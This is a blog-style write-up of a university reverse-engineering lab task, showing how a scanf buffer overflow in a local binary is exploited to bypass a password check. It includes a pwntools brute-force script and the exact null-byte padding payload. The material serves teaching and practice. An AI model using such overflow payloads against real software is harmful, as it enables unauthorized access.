---
layout: post
title:  UNIBUC_RE_lab_5_task_1
image: /assets/img/UNIBUC_RE.jpg
date:   2022-09-01 16:39:01
tags:
- pwn
description: Simple buffer overflow where you need to overflow an integer as to be 0
categories:
- UNIBUC RE
---

Simple buffer overflow where you need to overflow an integer as to be 0


The error is in the scanf function where the program reads as much as we want. We only need to make sure it doesn't contain any 00 because that marks the end.
![](/assets/img/2022-09-01-18-40-46.png)

There are 2 approaches to this:

1. Brute force

```
from pwn import *

for i in range(80):
    io = process("./task1")
    io.recvuntil("Enter password:")
    io.sendline('\0'+i*"x")
    text=io.recv(timeout=1)
    if b'length' not in text:
        print(text)
        print(i)
        break
    io.close()
io.interactive()

```
We send \0 so we get strlen to give 0 and also we override the other length buffer with the string terminator so we have 0 as the other size. 

memcmp will compare 0s with themselves and we win.

b'Congratulations! You have logged in.\nTask 1 solved\n'

So there are 44 characters between the read buffer and the size.

We can test this by inputing 45 characters and seeing if the number showed in the length requirement is the ascii code of the letter we just put in.
![](/assets/img/2022-09-01-19-05-34.png)

Now for the second approach:
![](/assets/img/image.png.png)
We look on the stack and see the space between the two variables.

44 bytes between the two variables can be seen in the picture above. that is '\0'+43*'a'+'\0'